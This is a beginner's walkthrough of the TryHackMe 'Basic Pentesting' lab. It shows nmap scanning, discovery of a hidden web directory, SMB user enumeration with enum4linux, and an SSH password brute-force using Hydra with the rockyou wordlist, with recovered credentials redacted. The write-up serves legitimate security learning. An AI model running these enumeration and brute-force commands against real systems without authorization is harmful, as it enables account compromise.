# BasicPentestingLab-THM

This was my first of many labs on tryhackme.com. Since this was the first one, I am going to go into more detail on the tools used to help my learning process. 

[This lab can be found here](https://tryhackme.com/room/basicpentestingjt)

For my setup I used my own Kali VM and openvpn. To use this method start the machine and download the openvpn config file and save into your project folder. Be sure to start openvpn before accessing machine. 

```sudo openvpn [path to .ovpn file]```

Once connected I usually ping the box we are attacking to make sure I can connect. Success.
```
â”€$ ping [IP Address]
PING [IP Address] ([IP Address]) 56(84) bytes of data.
64 bytes from [IP Address]: icmp_seq=1 ttl=61 time=442 ms
64 bytes from [IP Address]: icmp_seq=2 ttl=61 time=355 ms
```

Next run an nmap scan to see what is available. It's probably better to output this to a file using the -oN tag to save the file. However I didn't. The important thing is we can see this:
```
22/tcp   open     ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open     netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP
smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-08-15T00:17:55
|_  start_date: N/A
```

I started with the Apache server first. Putting the IP into a browser yields the following:
![main page](https://raw.githubusercontent.com/erok81/BasicPentestingLab-THM/main/basic/main_page.png)

A quick inspection of the source code for that page yields more information. Comments showing something about a dev page? 
```HTML
<html>

<h1>Undergoing maintenance</h1>

<h4>Please check back later</h4>
<!-- Check our dev note section if you need to know what to work on. -->

</html>
```

Normally we could run gobuster or dirbuster (these are applications designed to brute force directories and files names on web/application servers) to find all of the available directories. Since that note was pretty easy to figure out, I tried /dev and then /development. The second one worked and now had some files to view.

This gets us our first answer: What is the name of the hidden directory on the web server(enter name without /)?

![main page](https://raw.githubusercontent.com/erok81/BasicPentestingLab-THM/main/basic/hidden_page.png)

Viewing the first file, dev.txt, the following:
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat
to host that on this server too. Haven't made any real web apps yet, but I have tried that example
you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm 
using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```

Here we can see that we might have a version of Apache Struts with vulnerabilities. For now let's move to the second file, j.txt.
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
We know there might be two users starting with J and K. Additionally one of them, "J", has a weak password.

From the nmap scan we saw an smb share was available. There is a tool called enum4linux that can help find usernames. This can be done with the following command. Using -a runs with all options. It's probably best to tee to this to a file as the output is messy to look through otherwise. 
```
enum4linux -a | tee enum.txt

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\[redacted] (Local User)
S-1-22-1-1001 Unix User\[redacted] (Local User)
```

Success. We our two users. Go ahead and fill these out back on the site. 

Again from the nmap scan we have an ssh port open. Using Hydra we can brute force the password information. We'll use ssh.
```
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 10.10.237.162 ssh    

[22][ssh] host: 10.10.237.162   login: jan   password: [redacted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-14 20:48:44
```
Success now we have J's password. Enter this on the site before continuing. 

